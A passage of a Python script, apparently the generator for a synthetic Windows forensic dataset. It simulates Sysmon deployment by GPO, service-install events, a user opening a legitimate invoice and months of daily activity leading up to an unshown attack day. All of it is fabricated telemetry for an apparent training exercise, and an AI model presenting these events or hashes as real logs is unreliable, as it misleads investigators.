    sim.spawn(t + sec(2950), r"C:\Windows\System32\MoUsoCoreWorker.exe", r"C:\Windows\System32\mousocoreworker.exe -Embedding",
              sim.procs["svc_dcom"], "system", "System", life=60)
    return t + sec(3000)


def sysmon_deploy(sim, t):
    """GPO de inicio: instala Sysmon con la configuración corporativa (01/10)."""
    r = sim.rng
    P = sim.procs
    gp = sim.spawn(t, r"C:\Windows\System32\gpscript.exe", "gpscript.exe /startup", P["svc_gpsvc"], "system", "System", life=14)
    c = sim.spawn(t + sec(0.4), CMD, r'C:\Windows\system32\cmd.exe /c ""\\kelbrook.internal\SysVol\kelbrook.internal\Policies\{4F2B8C11-3D6A-4E9B-A7C2-1B5E9F0D2C33}\Machine\Scripts\Startup\instalar_sysmon.cmd" "',
                  gp, "system", "System", life=12)
    inst = sim.spawn(t + sec(1.1), r"C:\Windows\Sysmon64.exe", r"\\kelbrook.internal\NETLOGON\sysmon\Sysmon64.exe -accepteula -i \\kelbrook.internal\NETLOGON\sysmon\sysmonconfig-kelbrook.xml",
                     c, "system", "System", life=9)
    sim.sys(t + sec(4.2), "Service Control Manager", 7045, [
        ("ServiceName", S.STR, "SysmonDrv"), ("ImagePath", S.STR, r"SysmonDrv.sys"), ("ServiceType", S.STR, "controlador de modo kernel"),
        ("StartType", S.STR, "inicio de arranque"), ("AccountName", S.STR, "")], guid=GUIDS["Service Control Manager"],
        esn="Service Control Manager", qual=16384, kw=0x8080000000000000, pid=P["services"].pid, user="S-1-5-18")
    sim.sys(t + sec(5.0), "Service Control Manager", 7045, [
        ("ServiceName", S.STR, "Sysmon64"), ("ImagePath", S.STR, r"C:\Windows\Sysmon64.exe"),
        ("ServiceType", S.STR, "servicio de modo usuario"), ("StartType", S.STR, "inicio automático"),
        ("AccountName", S.STR, "LocalSystem")], guid=GUIDS["Service Control Manager"],
        esn="Service Control Manager", qual=16384, kw=0x8080000000000000, pid=P["services"].pid, user="S-1-5-18")
    sim.sysmon_pid = r.randrange(3000, 3600, 4)
    sv = sim.spawn(t + sec(5.6), r"C:\Windows\Sysmon64.exe", r"C:\Windows\Sysmon64.exe", P["services"], "system", "System", key="sysmon")
    sv.pid = sim.sysmon_pid
    sim.sysmon_from = t + sec(5.9)
    sim.sysmon(t + sec(5.9), 4, 3, [("UtcTime", S.STR, iso(t + sec(5.9), 3)), ("State", S.STR, "Started"),
                                    ("Version", S.STR, "15.15"), ("SchemaVersion", S.STR, "4.90")])
    sim.sysmon(t + sec(6.0), 16, 3, [("UtcTime", S.STR, iso(t + sec(6.0), 3)),
                                     ("Configuration", S.STR, r"\\kelbrook.internal\NETLOGON\sysmon\sysmonconfig-kelbrook.xml"),
                                     ("ConfigurationFileHash", S.STR, "SHA256=4B7E1C0A93D2F5E6A8B9C0D1E2F3A4B5C6D7E8F9A0B1C2D3E4F5A6B7C8D9E0F1")])


def legit_invoice(sim):
    """05/10: Lucía abre la factura legítima de Ardeal desde Outlook."""
    P = sim.procs
    ol = P["outlook"]
    t = T(5, 8, 9, 40.6)
    path = OUTLOOK_TMP + "Factura_ARD-2026-0884.pdf"
    sim.fcreate(t, ol, path)
    sim.stream(t + sec(0.003), ol, path, "[ZoneTransfer]\r\nZoneId=3\r\n")
    sim.spawn(t + sec(0.6), EDGE, f'"{EDGE}" --single-argument {path}', ol, "lmarin", life=0.38)
    edge_visit(sim, t + sec(1.4), "file:///" + path.replace("\\", "/"), "Factura_ARD-2026-0884.pdf", 0x30000006)
    sim.recent.append((t + sec(0.6), path, "pdf"))


def simulate():
    sim = Sim()
    sim.ps_seq = 1
    d = _date(2026, 3, 16)
    end = _date(2026, 10, 13)
    while d <= end:
        if d.month == 10 and d.day == ATTACK_DAY:
            attack_day(sim)
            break
        workday = d.weekday() < 5 and (d.month, d.day) not in HOLIDAYS and not any(a <= d <= b for a, b in VACATION)
        if not workday:
            d += timedelta(days=1)
            continue
        r = sim.rng
        sysmon_active = (d.month, d.day) > SYSMON_DEPLOY_DAY
        bh, bm = 8, r.randint(31, 49)
        if d == _date(2026, 3, 16):
            bh, bm = 10, 38
        boot = LOCAL(d.month, d.day, bh, bm, r.uniform(0, 59))
        ready = win_boot(sim, boot, sysmon_active)
        if (d.month, d.day) == SYSMON_DEPLOY_DAY:
            sysmon_deploy(sim, boot + sec(38.2))
        ym = f"2026-{max(1, d.month - 1 if d.day < 10 else d.month):02d}"
        if d == _date(2026, 3, 16):
            L = boot + sec(1365)
            user_logon(sim, L, "jtorres")
            sim.procs["explorer"] = sim.procs["explorer_j"]
            off = LOCAL(3, 16, 14, 31, 12)
            background(sim, L, off, "jtorres")
            defender_day(sim, boot, off)
            win_shutdown(sim, off, "jtorres")
            d += timedelta(days=1)
            continue
        L = boot + sec(r.uniform(120, 260))
        user_logon(sim, L)
        off = LOCAL(d.month, d.day, 17, r.randint(31, 59), r.uniform(0, 59)) if d.weekday() < 4 else \
            LOCAL(d.month, d.day, 15, r.randint(1, 40), r.uniform(0, 59))
        if (d.month, d.day) in WU_DAYS:
            mid = LOCAL(d.month, d.day, 15, 10, r.uniform(0, 59))
            user_day(sim, L, mid, ym)
            background(sim, L, mid)
            defender_day(sim, boot, mid)
            wu_end = wu_install(sim, mid - sec(3000), WU_DAYS[(d.month, d.day)], d.month)
            sim.ubr = UBR_BY_KB[WU_DAYS[(d.month, d.day)]]
            win_shutdown(sim, mid, "lmarin", by_update=True)
            boot = mid + sec(r.uniform(95, 160))
            win_boot(sim, boot, sysmon_active)
            L = boot + sec(r.uniform(60, 120))
            user_logon(sim, L)
        user_day(sim, L, off, ym)
        if d == _date(2026, 10, 5):
            legit_invoice(sim)
        background(sim, L, off)
        defender_day(sim, boot, off)
        win_shutdown(sim, off)
        d += timedelta(days=1)
    for ch in CH:
        sim.ev[ch].sort(key=lambda e: e.ft)
    return sim
